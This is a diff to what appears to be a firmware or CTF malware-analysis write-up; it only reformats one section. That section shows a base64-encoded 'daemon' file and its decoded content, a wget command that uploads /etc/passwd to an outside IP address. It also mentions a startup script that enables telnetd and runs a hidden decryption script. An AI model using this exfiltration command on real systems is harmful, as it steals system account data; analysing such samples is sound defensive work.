@@ -172,17 +172,18 @@ This script attempts to download a file named daemon from an external IP address
 <details>
 <summary>Going to /tmp/ path</summary>
 <br>
-```
+
 $ cd tmp
 $ ls
 daemon  daemon1  daemon2  wireless
 $ cat daemon
 W1sgLWYgL2V0Yy9wYXNzd2QgXV0gJiYgd2dldCAtLW1ldGhvZD1QT1NUIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIC0tYm9keS1maWxlPS9ldGMvcGFzc3dkICJodHRwOi8vMjAzLjAuMTEzLjI1LyI
-```
+
 The `daemon` seems like base64, so I decoded it and got this - 
 #
-        [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
+    [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
 </details>
+
 ### **S80network**
 This script parses network configuration parameters from /proc/cmdline. It configures the network interface, enables Telnet (telnetd), and executes a hidden decryption script (/usr/sbin/.dec.sh) on the downloaded service daemon.
 ```
